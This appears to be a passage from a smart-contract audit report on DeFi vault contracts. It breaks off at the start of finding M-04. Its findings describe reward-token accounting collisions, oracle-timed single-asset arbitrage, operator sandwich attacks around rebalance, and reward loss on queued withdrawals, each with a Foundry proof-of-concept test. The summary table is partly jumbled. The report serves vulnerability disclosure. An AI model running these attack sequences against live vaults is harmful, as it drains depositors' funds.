
| ID                                                                                                                 | Title                                                                                                            | Severity |
| ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- | -------- |
| [H-01](malicious user can DOS updateRewardsDurationForVault)                                                       | Incase rewardToken or extraRewardToken is the same as tokenx or tokeny the vault calculations will be broken     | high     |
| [M-01] Malicious Actors Can Leverage Single Asset Deposits for Arbitrage                                           | [M-01] Malicious Actors Can Leverage Single Asset Deposits for Arbitrage                                         | medium   |
| [M-02] Malicious operator can collect most of the rewads frontrunning rebalance by sandwiching harvestvault        | [M-02] Malicious operator can collect most of the rewads frontrunning rebalance by sandwiching harvestvault      | medium   |
| [M-03] incorrect reward calculation make early withdrawers suffer loss of rewards                                  | [M-03] incorrect reward calculation make early withdrawers suffer loss of rewards                                | medium   |
| [M-04] innocent users suffers loss of rewards in-case of emergency mode due to wrong rewardDebt traking mechanism] | M-04] innocent users suffers loss of rewards in-case of emergency mode due to wrong rewardDebt traking mechanism | medium   |
| [M-05] discrepancy of max aum fee in VaultFactory and strategy leads to unnecessary reverts                        | [M-05] discrepancy of max aum fee in VaultFactory and strategy leads to unnecessary reverts                      | medium   |
| ## [I-01] Wrong tracking of lastRewardBalance in safeRewardTransfer will DOS the vault                             | ## [I-01] Wrong tracking of lastRewardBalance in safeRewardTransfer will DOS the vault                           | Info     |
| ## [I-02] In emergency Mode there might be some left rewards in the rewarder that isn't claimed                    | ## [I-02] In emergency Mode there might be some left rewards in the rewarder that isn't claimed                  | Info     |

## [H-01] Incase rewardToken or extraRewardToken is the same as tokenx or tokeny the vault calculations will be broken

### Summary

If the `rewardToken` or `extraRewardToken` used by a strategy is the same as `tokenX` or `tokenY` of the vault, the internal accounting will break. This occurs during reward harvesting or after calls to strategy functions such as:

- `withdrawAll`
- `emergencyWithdrawRange`
- `rebalance`

These functions internally trigger `executeQueuedWithdrawals`, which assumes that incoming balances are purely user funds. If rewards are in the same token as a vault asset, these balances can be misinterpreted, leading to incorrect accounting and misallocated funds.

### Finding Description

Rewards are transferred from the strategy to the vault via the `harvestRewards` function. However, there’s no safeguard to prevent the `rewardToken` or `extraRewardToken` from being one of the vault's main assets (`tokenX` or `tokenY`).

```
File: Strategy.sol808:     function _harvestRewards() internal {//   CODE822:         // claim the rewards for current deposited bins823:         // claim on MC Rewarder will also claim on the Extra Rewarder if any824:         rewarder.claim(address(this), ids);825: 826:         // transfer all rewards to the vault827:         IERC20 rewardToken = rewarder.getRewardToken();828:@>       TokenHelper.safeTransfer(rewardToken, _vault(), TokenHelper.safeBalanceOf(rewardToken, address(this)));829:
```

If a strategy calls one of the following before rewards are harvested:

- `withdrawAll`
- `emergencyWithdrawRange`
- `rebalance`

then any unclaimed rewards (if matching `tokenX` or `tokenY`) will be included in the vault’s balance calculations. This leads to rewards being misinterpreted as user deposits or vault funds, corrupting share calculations and fund accounting.

### Impact Explanation

All accounting between vault and strategy will be broken

- User deposits may be mistaken for rewards or vice versa.
- Strategy-to-vault transfers during emergency or rebalance calls may silently corrupt accounting.

### Likelihood Explanation

No constraint from preventing the rewards of being the same as either `tokenX` or `tokenY`

### Proof of Concept

Add this function in the `StrategyMock` in `OracleRewardVault.t.sol`

```
function withdrawAll() external {}
```

Add this in `OracleRewardVault.t.sol` and run the command `forge test --mt testRewardIsTheSameAsTokenX --via-ir -vvv`

```
function testRewardIsTheSameAsTokenX() public {        ERC20Mock tokenX = new ERC20Mock("WIOTA", "WIOTA", 18);        ERC20Mock tokenY = new ERC20Mock("USDC", "USDC", 6);
        ILBPair pair = ILBPair(address(new LBPairMock(tokenX, tokenY)));
        ERC20Mock rewardToken = new ERC20Mock("LUM", "LUM", 18);        ERC20Mock extraRewardToken = new ERC20Mock("SEA", "SEA", 18);
        VaultFactory localFactory = VaultFactory(            address(                new TransparentUpgradeableProxy(                    address(new VaultFactory(address(tokenX))),                    address(1),                    abi.encodeWithSelector(VaultFactory.initialize2.selector, address(this))                )            )        );
        // whitelist pair        address[] memory pairs = new address[](1);        pairs[0] = address(pair);        localFactory.setPairWhitelist(pairs, true);
        OracleRewardVault oracleRewardVault = new OracleRewardVault(localFactory);        localFactory.setVaultImplementation(IVaultFactory.VaultType.Oracle, address(oracleRewardVault));
        localFactory.setStrategyImplementation(IVaultFactory.StrategyType.Default, address(new StrategyMock()));
        localFactory.setPriceLens(IPriceLens(new PriceLensMock()));        localFactory.setFeeRecipient(treasury);
        hoax(max, 75 ether);        (address vault, address strategy) = localFactory.createMarketMakerOracleVault{value: 75 ether}(pair, 0.1e4);
        // have to set it manuelly cause this is a clone        StrategyMock(strategy).setOperator(max);        StrategyMock(strategy).setRewardToken(tokenX);        StrategyMock(strategy).setExtraRewardToken(extraRewardToken);        StrategyMock(strategy).setTokenX(tokenX);        StrategyMock(strategy).setTokenY(tokenY);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        // disable twap price check        vm.prank(address(localFactory));        rewardVault.enableTWAPPriceCheck(false);
        // mint token mocking        tokenX.mint(bob, 10e18);        tokenY.mint(bob, 12e6);
        vm.startPrank(bob);        tokenX.approve(vault, 10e18);        tokenY.approve(vault, 12e6);
        (uint256 shares,,) = rewardVault.deposit(10e18, 12e6, 0);        vm.stopPrank();
        // mocking the harvest and add rewardtoken        tokenX.mint(vault, 20e18);
        //retreiving reward balances before sending tokens from strategy to the vault in emergency mode        uint256 vaultRewardBalance1 = TokenHelper.safeBalanceOf(tokenX, vault);        console2.log("vault reward balance before emergency", vaultRewardBalance1);                // funds will not collide and will be correct        (uint256 vaultbalancesx1,uint256 vaultbalancesy1) = IBaseVault(vault).getBalances();        console2.log("vault balance x before emergency", vaultbalancesx1);        console2.log("vault balances y before emergency", vaultbalancesy1);
        // after emergency mode or rebalance balance calculations will be broken        localFactory.setEmergencyMode(rewardVault);        (uint256 vaultbalancesx2,uint256 vaultbalancesy2) = IBaseVault(vault).getBalances();        console2.log("vault balances x after emergency", vaultbalancesx2);//vault balance x will be the same as rewardbalance breaking all calculations        console2.log("vault balances y after emergency", vaultbalancesy2);        //retreiving reward balances        uint256 vaultRewardBalance2 = TokenHelper.safeBalanceOf(tokenX, vault);        console2.log("vault reward balance", vaultRewardBalance2);    }
```

Expected output: reward vault balance has become the same as tokenX balance

```
[PASS] testRewardIsTheSameAsTokenX() (gas: 14945513)Logs:  vault reward balance before emergency 20000000000000000000  vault balance x before emergency 10000000000000000000  vault balances y before emergency 12000000  vault balances x after emergency 20000000000000000000  vault balances y after emergency 0  vault reward balance 20000000000000000000
```

### Recommendation

Add a check to confirm than the `rewarder.rewardToken` and `extraRewarder.RewardToken` ins't neither `tokenX` or `tokenY`


## [M-01] Malicious Actors Can Leverage Single Asset Deposits for Arbitrage

### Summary

The current implementation allows single-asset deposits into the `OracleVault`, introducing a vulnerability that enables malicious actors to arbitrage oracle price updates and extract unearned value from the protocol. This is primarily due to the 5% deviation threshold, which can be exploited by sandwiching transactions around oracle updates and vault rebalances.

An attacker, especially one with operator privileges, can front-run oracle price changes, deposit only the more favorable token, and then sandwich the rebalance with queue and redeem to withdraw more value than they deposited. This results in a net loss to the protocol.

1. frontrun with
    1. deposit only tokenX or tokenY who has more deviation that benefits him
2. price change reflected
3. backrun with
    1. queue withdraw
    2. then rebalance
    3. then redeem withdraw (get tokenX and tokenY according to shares initially got with higher price)

### Finding Description

In `OracleVault.sol`, users are allowed to deposit only one of the two tokens (`tokenX` or `tokenY`) and still receive vault shares. This behavior can be exploited in conjunction with oracle updates and rebalancing to extract profits without actual impermanent loss or risk.

**Example 1 — TokenX price drops 5%:**

1. **Pre-price update:**  
    The attacker deposits `2e18` of `TokenX`, which at that moment is equivalent to `2e18` of `TokenY`, receiving shares equivalent to `1e18` of `TokenX` and `1e18` of `TokenY`.
2. **Oracle update:**  
    The price of `TokenX` drops 5%, making `2e18` `TokenX` now worth only `1.9e18` `TokenY`.
3. **Withdrawal strategy:**
    - Queue a withdrawal.
    - Trigger a vault rebalance (either naturally or as an operator).
    - Redeem shares, receiving `1e18` `TokenX` and `1e18` `TokenY`.
4. **Final balance (converted to `TokenY`):**
    - `1e18 TokenX` = `0.95e18 TokenY` (after 5% price drop)
    - Plus `1e18 TokenY` = `1.95e18 TokenY` total
    - Profit: `1.95e18 - 1.9e18 = 0.05e18` (profit - MaxAumFee) = (2.5% - 0.06138%) = 2.43862% gain

**Example 2 — TokenX price increases 5%:**

The inverse strategy is used by depositing only `TokenY` before a price increase in `TokenX`. A similar 2.5% profit can be extracted after the oracle update and subsequent rebalance.

For rebalance there is aum fee that is from 0 to 25% on yearly rate with max apply of 1 day at a time so its negligible value as if we considered maxFee 25% will be equal to 0.06138% for daily rate

Or instead of sandwiching rebalance one of those function were executing the same block the price change is to be set

- `vault::setemergencymode` call `strategy::withdrawAll` (not very likely as in this case not much funds would be there but still could have enough amount for the attack to happen
- `emergencyWidthdrawRange`
- `rebalance`

### Impact Explanation

steal of funds

### Likelihood Explanation

- **Non-operators:**  
    Requires precise timing and may not be consistently exploitable unless a (rebalance, emergencyWidthdrawRange, withdrawAll) is triggered in the same block as the oracle update.
- **Operators or sophisticated bots:**  
    High likelihood. Operators can front-run oracle updates and control rebalancing, making exploitation trivial and frequent.

### Proof of Concept

Add this test in `01_POC.t.sol` file

run this command to execute the test `forge test --mt test_PreviewSharesWithZeroAmountss --via-ir -vvv`

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
import "forge-std/Test.sol";import "forge-std/console.sol";import "openzeppelin/proxy/transparent/TransparentUpgradeableProxy.sol";import "openzeppelin/proxy/transparent/ProxyAdmin.sol";import {IERC20, ILBPair} from "joe-v2/interfaces/ILBPair.sol";import "../src/BaseVault.sol";import "../src/VaultFactory.sol";import "../src/SimpleVault.sol";import "../src/OracleRewardVault.sol";import "../src/Strategy.sol";
import {ERC20Mock} from "./mocks/ERC20.sol";// this is a fork test for OracleRewardVault// You can use this as base for a PoCcontract PoCTest is Test {

    address max = makeAddr("maxmaker");    address bob = makeAddr("bob");    address alice = makeAddr("alice");    address treasury = makeAddr("treasury");

    function test_PreviewSharesWithZeroAmountss() external {
        ERC20Mock tokenX = new ERC20Mock("WIOTA", "WIOTA", 18);        ERC20Mock tokenY = new ERC20Mock("USDC", "USDC", 18);
        ILBPair pair = ILBPair(address(new LBPairMock(tokenX, tokenY)));
        ERC20Mock rewardToken = new ERC20Mock("LUM", "LUM", 18);        ERC20Mock extraRewardToken = new ERC20Mock("SEA", "SEA", 18);
        VaultFactory localFactory = VaultFactory(            address(                new TransparentUpgradeableProxy(                    address(new VaultFactory(address(tokenX))),                    address(1),                    abi.encodeWithSelector(VaultFactory.initialize2.selector, address(this))                )            )        );
        // whitelist pair        address[] memory pairs = new address[](1);        pairs[0] = address(pair);        localFactory.setPairWhitelist(pairs, true);
        OracleRewardVault oracleRewardVault = new OracleRewardVault(localFactory);        localFactory.setVaultImplementation(IVaultFactory.VaultType.Oracle, address(oracleRewardVault));
        localFactory.setStrategyImplementation(IVaultFactory.StrategyType.Default, address(new StrategyMock()));
        localFactory.setPriceLens(IPriceLens(new PriceLensMock()));        localFactory.setFeeRecipient(treasury);

        IAggregatorV3X dfXv3 = new MockAggregatorX();        IAggregatorV3X dfYv3 = new MockAggregatorY();        address dfXx = address(dfXv3);        address dfYy = address(dfYv3);        IAggregatorV3 dfX = IAggregatorV3(dfXx);        IAggregatorV3 dfY = IAggregatorV3(dfYy);        // hoax(max, 75 ether);        (address vault, address strategy) = localFactory.createOracleVaultAndDefaultStrategy(pair, IAggregatorV3(dfX), IAggregatorV3(dfY));        // setting vault values        localFactory.setDatafeedHeartbeat(vault, 100, 100);        localFactory.setTwapInterval(vault, 120);        localFactory.enableTWAPPriceCheck(vault, true);        localFactory.setDeviationThreshold(vault, 5);
        // have to set it manuelly cause this is a clone        StrategyMock(strategy).setOperator(max);        StrategyMock(strategy).setRewardToken(rewardToken);        StrategyMock(strategy).setExtraRewardToken(extraRewardToken);        StrategyMock(strategy).setTokenX(tokenX);        StrategyMock(strategy).setTokenY(tokenY);

        // mint token mocking        tokenX.mint(bob, 20e18);        tokenY.mint(bob, 20e18);
        vm.startPrank(bob);        tokenX.approve(vault, type(uint256).max);        tokenY.approve(vault, type(uint256).max);

        tokenX.mint(alice, type(uint128).max);        tokenY.mint(alice, type(uint128).max);
        vm.startPrank(alice);        tokenX.approve(vault, type(uint256).max);        tokenY.approve(vault, type(uint256).max);
        vm.warp(17000000);        vm.startPrank(alice);        (uint256 Alice_shares,,) = IOracleVault(vault).deposit(1000000e18, 1000000e18, 0);// adding some deposits to the vault        // console2.log("Alice shares:", Alice_shares);        vm.stopPrank();

        (uint256 shares, uint256 effectiveX, uint256 effectiveY) = IOracleVault(vault).previewShares(0, 1e18);

        // depositing only TokenY and receive shares acoording to its value        vm.startPrank(bob);        (uint256 Bob_shares,,) = IOracleVault(vault).deposit(0, 1e18, 0);// adding some deposits to the vault        vm.stopPrank();
        //The price change        dfXv3.setPrice(1.05e18);        (uint256 shares_after_price_Change, uint256 effectiveX111, uint256 effectiveY111) = IOracleVault(vault).previewShares(0, 1e18);        console2.log("shares Before Price Change :", shares);        console2.log("shares After Price Change :", shares_after_price_Change);        console2.log("extra shares the user got : ", shares - shares_after_price_Change);
        // now when a user deposit with this price and then exit he will make profit receiving extra amount than he should        (uint256 amountX_Single_Deposit_before, uint256 amountY_Single_Deposit_before) = IBaseVault(vault).previewAmounts(Bob_shares);        console2.log("amountX the user received :", amountX_Single_Deposit_before);        console2.log("amountY the user received :", amountY_Single_Deposit_before);
        // calculating the user profit he entered with 1e18 tokenY and exit now has 1.025e18 tokenY making 2.5% profit        uint256 Total_received = amountX_Single_Deposit_before * 105/100 + amountY_Single_Deposit_before;
        // (uint256 amountX_Single_Deposit_After, uint256 amountY_Single_Deposit_After) = IBaseVault(vault).previewAmounts(shares_after_price_Change);        // console2.log("amountX After Price Change:", amountX_Single_Deposit_After);        // console2.log("amountY After Price Change:", amountY_Single_Deposit_After);
        console2.log("profit as token Y :", Total_received - 1e18);
    }
}

interface IAggregatorV3X {    function decimals() external view returns (uint8);
    function description() external view returns (string memory);
    function version() external view returns (uint256);
    function getRoundData(uint80 _roundId)        external        view        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function latestRoundData()        external        view        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);    function setPrice(int256 _price) external;}
contract MockAggregatorX is Ownable, IAggregatorV3X {    int256 public price = 1e18;
    function decimals() external pure override returns (uint8) {        return 18;    }
    function description() external pure override returns (string memory) {        return "Mock Aggregator";    }
    function version() external pure override returns (uint256) {        return 1;    }
    function getRoundData(uint80)        external        view        override        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)    {        return (1, price, 2, block.timestamp, 0);    }
    function latestRoundData()        external        view        override        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)    {        return (1, price, 2, block.timestamp, 0);
    }
    function setPrice(int256 _price) external onlyOwner {        price = _price;    }}contract MockAggregatorY is Ownable, IAggregatorV3X {    int256 price = 1e18;
    function decimals() external pure override returns (uint8) {        return 18;    }
    function description() external pure override returns (string memory) {        return "Mock Aggregator";    }
    function version() external pure override returns (uint256) {        return 1;    }
    function getRoundData(uint80)        external        view        override        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)    {        return (1, price, 2, block.timestamp, 0);    }
    function latestRoundData()        external        view        override        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)    {        return (1, price, 2, block.timestamp, 0);    }
    function setPrice(int256 _price) external onlyOwner {        price = _price;    }}

contract LBPairMock {    IERC20 internal _tokenX;    IERC20 internal _tokenY;
    constructor(IERC20 tokenX, IERC20 tokenY) {        _tokenX = tokenX;        _tokenY = tokenY;    }
    function getTokenX() external view returns (IERC20) {        return _tokenX;    }
    function getTokenY() external view returns (IERC20) {        return _tokenY;    }
    function increaseOracleLength(uint16 size) external pure {        size;    }
    function getOracleParameters() external pure returns (uint8, uint16, uint16, uint40, uint40) {        return (1, 1, 1, 1, 1);    }    function getOracleSampleAt (uint40 lookupTimestamp)        external        view        returns (uint64 cumulativeId, uint64 cumulativeVolatility, uint64 cumulativeBinCrossed) {        if(lookupTimestamp == block.timestamp - 120){            cumulativeId = 929229;            cumulativeVolatility = 1;            cumulativeBinCrossed = 1;        }else{            cumulativeId = 1393843;            cumulativeVolatility = 1;            cumulativeBinCrossed = 1;        }    }
    function getPriceFromId(uint24 id) external pure returns (uint256) {        { id; }        return 340282366920938463463374607431768211456;// this is a shifted value of The initial price    }}
contract StrategyMock is Clone {    IERC20 internal _rewardToken;    IERC20 internal _extraRewardToken;    address internal _operator;
    IERC20 _tokenX;    IERC20 _tokenY;
    function getRewardToken() external view returns (IERC20) {        return _rewardToken;    }
    function getExtraRewardToken() external view returns (IERC20) {        return _extraRewardToken;    }
    function setTokenX(IERC20 tokenX) external {        _tokenX = tokenX;    }
    function setTokenY(IERC20 tokenY) external {        _tokenY = tokenY;    }
    function getBalances() external view returns (uint256 amountX, uint256 amountY) {        amountX = _tokenX.balanceOf(address(this));        amountY = _tokenY.balanceOf(address(this));    }
    function getVault() external pure returns (address) {        return _getArgAddress(0);    }
    function getPair() external pure returns (ILBPair) {        return ILBPair(_getArgAddress(20));    }
    function getTokenX() external pure returns (IERC20Upgradeable tokenX) {        tokenX = IERC20Upgradeable(_getArgAddress(40));    }
    function getTokenY() external pure returns (IERC20Upgradeable tokenY) {        tokenY = IERC20Upgradeable(_getArgAddress(60));    }
    function hasRewards() external pure returns (bool) {        return true;    }
    function hasExtraRewards() external pure returns (bool) {        return true;    }
    function setPendingAumAnnualFee(uint16) external {}
    function setFeeRecipient(address) external {}
    function initialize() external {}
    function setOperator(address operator) external {        _operator = operator;    }
    function setRewardToken(IERC20 rewardToken) external {        _rewardToken = rewardToken;    }
    function setExtraRewardToken(IERC20 extraRewardToken) external {        _extraRewardToken = extraRewardToken;    }
    function withdrawAll() external {}}
contract PriceLensMock is IPriceLens {    function getTokenPriceNative(address) external pure override returns (uint256 price) {        return 1e18;    }}
```

expected output:

```
[PASS] test_PreviewSharesWithZeroAmountss() (gas: 15008964)Logs:  shares Before Price Change : 1000000000000000000000000  shares After Price Change : 975609767995235124275549  extra shares the user got :  24390232004764875724451  amountX the user received : 499999750000124999  amountY the user received : 500000249999875000  profit as token Y : 24999987500006248
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.99ms (4.44ms CPU time)
```

### Recommendation

- **Penalty Fees on Single-Asset Deposits:**  
    Introduce a dynamic fee when `amountX != amountY` during deposit. The fee should scale with the deviation to deter strategic single-sided entries.

Or

- **Force Token Pairing via External Router:**  
    When a user deposits a single asset, route half the amount through an external DEX to acquire the counterpart token. Deposit the resulting token pair to maintain pool balance and issue shares fairly.

Both solutions significantly reduce the feasibility of this arbitrage attack by either penalizing imbalanced deposits or removing the imbalance entirely.

## [M-02] Malicious operator can collect most of the rewads frontrunning rebalance by sandwiching harvestvault

### Summary

Operator might steal most of the rewards sandwiching `rebalance` by sandwiching `harvestvault` call flow might be as follow

1. First
    - `deposit`
    - `harvestRewards`
    - `queueWithdrawal`
2. `rebalance`
3. `redeemQueuedWithdrawal`

### Finding Description

Rewards is distributed every range when `rebalance` is called or if an operator harvest rewards malisious operator can sandwitch the `rebalance` making a sandwitch to harvestrewards then withdraw

Let's say that the current contract state is as follows:

- Totalshares: 1_000e18
- Let's say that the rewards in the vault are 150e18;
- The malicious operator utilizes a flash-loan, and deposits 50_000e18 units of tokens to the vault;
- shares = 50_000e18 * 1_000e18 / 1_050e18 = 47_619e18;
- The malicious operator calls `harvestRewards()`, which in return send the rewards to the Vault
- Total Supply: 48_619e18;
- Total Assets: 51_200e18;
- Malicious operator calls `queueWithdrawal` trading shares in exchange of assets:
- The `rebalance` call is executed starting a new round and let queued withdrawal to complete
- Malicious operator calls `redeemQueuedWithdrawal`
- 47_619e18 * 51_200e18 / 48_619e18 = 50_146e18;

With this, the malicious operator has successfully sandwiched ~97% of the increase in valuation of the vault (took 146e18 out of the 150e18 reward tokens).

note: there is an aum is extracted if it was set when rebalance is called but its very small value as if considered maxAumFee = 25% yearly it will end up 0.06138% so its neglected as the attack will make more profit than this value

### Impact Explanation

Malicious operator is able to steal any significant jumps in the valuation of the vault rewards achieved through a sandwich attack on the `rebalance`.

### Likelihood Explanation

Any operator can exploit this, especially if flashloans are utilized.

### Proof of Concept

add this function in `OracleRewardVault.t.sol` in `OracleRewardVaultTest` contract

run the command `forge test --mt testSandwitchRebalance --via-ir -vvv`

```
function testSandwitchRebalance() public {        // increase oracle so we can do a twap price check        (, uint256 oracleLength, , , ) = ILBPair(IOTA_USDC_E_PAIR).getOracleParameters();        if (oracleLength < 3) {            ILBPair(IOTA_USDC_E_PAIR).increaseOracleLength(3);        }
        skip(2 minutes);
        hoax(max, 75 ether);        (address vault, address strategy) =            _factory.createMarketMakerOracleVault{value: 75 ether}(ILBPair(IOTA_USDC_E_PAIR), 0.1e4);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        IERC20Upgradeable tokenX = rewardVault.getTokenX();        IERC20Upgradeable tokenY = rewardVault.getTokenY();
        uint256 amountX = 10 * 10 ** IERC20MetadataUpgradeable(address(tokenX)).decimals(); // wnative        uint256 amountY = 0;
        // bob deposits        deal(bob, amountX); // deal with erc20 is not working on iota evm
        vm.startPrank(bob);        IWNative(WNATIVE).deposit{value: amountX}();
        tokenX.approve(vault, amountX);        (uint256 shares,,) = rewardVault.deposit(amountX, amountY, 0);        vm.stopPrank();
        // rebalance        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        skip(10 minutes);
        uint256 amount100X = 1000 * 10 ** IERC20MetadataUpgradeable(address(tokenX)).decimals(); // wnative
        // 1 alice deposits starte        deal(alice, amount100X);         vm.startPrank(alice);        IWNative(WNATIVE).deposit{value: amount100X}();        tokenX.approve(vault, amount100X);        (uint256 aliceShares,,) = rewardVault.deposit(amount100X, amountY, 0);        vm.stopPrank();
        // 2 harvest rewards        // mock the harvest of the rewards sending some rewardtokens        IERC20 rewardToken = IStrategy(strategy).getRewardToken();        // deal(address(rewardToken), strategy, 20e18);        vm.prank(strategy);        Strategy(strategy).harvestRewards();
        // 3 queue withdrawal        vm.startPrank(alice);        rewardVault.queueWithdrawal(aliceShares, alice);        vm.stopPrank();                //alice then claim most of the rewards        console2.log("alice claimed rewards", rewardToken.balanceOf(alice));
        //left rewards is too little compared to alices claimed as it got most of the rewards        uint256 vaultBalance = TokenHelper.safeBalanceOf(rewardToken, vault);        console2.log("left rewards", vaultBalance);
        // 4 the frontrunned rebalance        vm.prank(max);        _rebalanceSingleSide(max, IOTA_USDC_E_PAIR, strategy);
        // 5 redeemQueuedWithdrawal        vm.startPrank(alice);        rewardVault.redeemQueuedWithdrawal(0, alice);        vm.stopPrank();
    }
```

Expected output: Alice claimed nearly all the rewards

```
Ran 1 test for test/OracleRewardVault.t.sol:OracleRewardVaultTest[PASS] testSandwitchRebalance() (gas: 3053783)Logs:  alice claimed rewards 57917602180538  left rewards 579175266299
```

### Recommendation

There is many solutions like

- Prevent same block deposit withdrawal or penalize it
- apply a fee on deposit/withdraw and keep it to strategy to disincentive the attack


## [M-03] incorrect reward calculation make early withdrawers suffer loss of rewards

### Summary

In `OracleRewardVault`, rewards are distributed on a round basis. However, users who queue a withdrawal before a call to `harvestRewards` miss out on rewards—even though their funds are still locked in the vault and contributing to yield. This results in a reward loss that shouldn’t happen.

This behavior is caused by premature updates to a user's share balance when queuing a withdrawal, rather than deferring those changes until withdrawal execution (e.g., in `redeemQueuedWithdrawal`).

### Finding Description

The `queueWithdrawal` function immediately modifies the user’s share balance, which directly affects reward calculations:

```
File: BaseVault.sol477:     function queueWithdrawal(uint256 shares, address recipient)//   CODE490:         _updatePool();491: 492:         // Transfer the shares to the strategy, will revert if the user does not have enough shares.493:@>       _transfer(msg.sender, strategy, shares);494: 495:@>       _modifyUser(msg.sender, -int256(shares));
```

Meanwhile, rewards are distributed during `harvestRewards`, which updates the reward pool based on current share allocations.

If a user queues a withdrawal just before `harvestRewards`, they no longer have those shares counted—even though their funds are still active in the vault. This results in an unfair loss of pending rewards.

### Impact Explanation

Users who queue a withdrawal before `harvestRewards` is called will lose the rewards they should have earned while their funds remained in the vault.

- **Reward unfairness**: Users queuing earlier receive less than those who wait.
- **Inconsistent user experience**: Share ownership is still effectively active but no longer rewarded.
- **Protocol trust concerns**: Users may notice inconsistent or unexpectedly low rewards.

### Likelihood Explanation

The issue occurs in realistic scenarios where users queue withdrawals before the operator calls `harvestRewards`.

### Proof of Concept

add this in `OracleRewardVault.t.sol` in `OracleRewardVaultTest`

run this command `forge test --mt testLossOfRewardsHarvestAfterQueue -vvvv`

```
function testLossOfRewardsHarvestAfterQueue() public {        ERC20Mock tokenX = new ERC20Mock("WIOTA", "WIOTA", 18);        ERC20Mock tokenY = new ERC20Mock("USDC", "USDC", 6);
        ILBPair pair = ILBPair(address(new LBPairMock(tokenX, tokenY)));
        ERC20Mock rewardToken = new ERC20Mock("LUM", "LUM", 18);        ERC20Mock extraRewardToken = new ERC20Mock("SEA", "SEA", 18);
        VaultFactory localFactory = VaultFactory(            address(                new TransparentUpgradeableProxy(                    address(new VaultFactory(address(tokenX))),                    address(1),                    abi.encodeWithSelector(VaultFactory.initialize2.selector, address(this))                )            )        );
        // whitelist pair        address[] memory pairs = new address[](1);        pairs[0] = address(pair);        localFactory.setPairWhitelist(pairs, true);
        OracleRewardVault oracleRewardVault = new OracleRewardVault(localFactory);        localFactory.setVaultImplementation(IVaultFactory.VaultType.Oracle, address(oracleRewardVault));
        localFactory.setStrategyImplementation(IVaultFactory.StrategyType.Default, address(new StrategyMock()));
        localFactory.setPriceLens(IPriceLens(new PriceLensMock()));        localFactory.setFeeRecipient(treasury);
        hoax(max, 75 ether);        (address vault, address strategy) = localFactory.createMarketMakerOracleVault{value: 75 ether}(pair, 0.1e4);
        // have to set it manuelly cause this is a clone        StrategyMock(strategy).setOperator(max);        StrategyMock(strategy).setRewardToken(rewardToken);        StrategyMock(strategy).setExtraRewardToken(extraRewardToken);        StrategyMock(strategy).setTokenX(tokenX);        StrategyMock(strategy).setTokenY(tokenY);
        OracleRewardVault rewardVault = OracleRewardVault(payable(vault));
        // disable twap price check        vm.prank(address(localFactory));        rewardVault.enableTWAPPriceCheck(false);
        // mint token        tokenX.mint(bob, 10e18);        tokenY.mint(bob, 0);
        tokenX.mint(alice, 10e18);        vm.startPrank(alice);        tokenX.approve(vault, 10e18);        tokenY.approve(vault,0);        (uint256 AliceShares,,) = rewardVault.deposit(10e18, 0, 0);        vm.stopPrank();
        vm.startPrank(bob);        tokenX.approve(vault, 10e18);        tokenY.approve(vault, 0);
        (uint256 shares,,) = rewardVault.deposit(10e18, 0, 0);        vm.stopPrank();
        // mocking harvestvault and mint rewardtokens 1st time        rewardToken.mint(vault, 20e18);
        vm.prank(bob);        IOracleVault(vault).queueWithdrawal(shares, bob);
        skip(1 minutes);
        IOracleRewardVault.User memory bobDataBefore = rewardVault.getUserInfo(bob);        assertEq(bobDataBefore.rewardDebt,0);        // mocking harvestvault and mint rewardtokens 2nd time        rewardToken.mint(vault, 20e18);
        // now after a new rewards is submitted a user decided to cancel withdrawal         vm.prank(bob);        IOracleVault(vault).cancelQueuedWithdrawal(shares);
        // bob goes out and didn't claim anyrewards though he has a pending rewards        vm.startPrank(bob);        rewardVault.claim();        IOracleRewardVault.User memory bobDataBefore3 = rewardVault.getUserInfo(bob);        vm.stopPrank();        uint256 bobBalance1st = rewardToken.balanceOf(bob);        assertEq(bobBalance1st,10000000500000075000);//total balance received is 10000000500000075000

        // alice has queued withdrawal after harvest was called so she'll get the full rewards        vm.startPrank(alice);        IOracleVault(vault).queueWithdrawal(AliceShares, alice);// alice queued all her shares after harvest was called so she'll get the full rewards?!!!        IOracleRewardVault.User memory aliceDataBefore = rewardVault.getUserInfo(alice);        vm.stopPrank();        uint256 aliceBalance1st = rewardToken.balanceOf(alice);        assertEq(aliceBalance1st,29999999499999924999);//total balance received is 29999999499999924999    }
```

Expected Output: balance of the Alice of the reward-token is greater than bob because she queued after harvest

```
// bob balance  ├─ [585] ERC20Mock::balanceOf(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]    │   └─ ← [Return] 10000000500000075000 [1e19]
// alice balance    ├─ [585] ERC20Mock::balanceOf(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]    │   └─ ← [Return] 29999999499999924999 [2.999e19]    └─ ← [Stop]
```

### Recommendation

its advised to adjust users shares in `redeemqueuedwithdrawal` and not in (`queuewithdarawal`/ `cancelQueuedWithdrawal` )

```
File: BaseVault.sol477:     function queueWithdrawal(uint256 shares, address recipient)//   code--         _updatePool();          // Transfer the shares to the strategy, will revert if the user does not have enough shares.--         _transfer(msg.sender, strategy, shares); --         _modifyUser(msg.sender, -int256(shares));
```

apply them properly in redeem Queued Withdrawal

```
++         _updatePool();          // Transfer the shares to the strategy, will revert if the user does not have enough shares.++         _transfer(msg.sender, strategy, shares); ++         _modifyUser(msg.sender, -int256(shares));
```

## [M-04] innocent users suffers loss of rewards in-case of emergency mode due to wrong rewardDebt traking mechanism

### Summary

In emergency mode, deposits and reward distribution are halted by setting the strategy address to `address(0)`. However, **token transfers between users are still allowed**, and these transfers silently update users’ reward debt, leading to **permanent loss of unclaimed rewards** for the sender and recipient.

### Finding Description

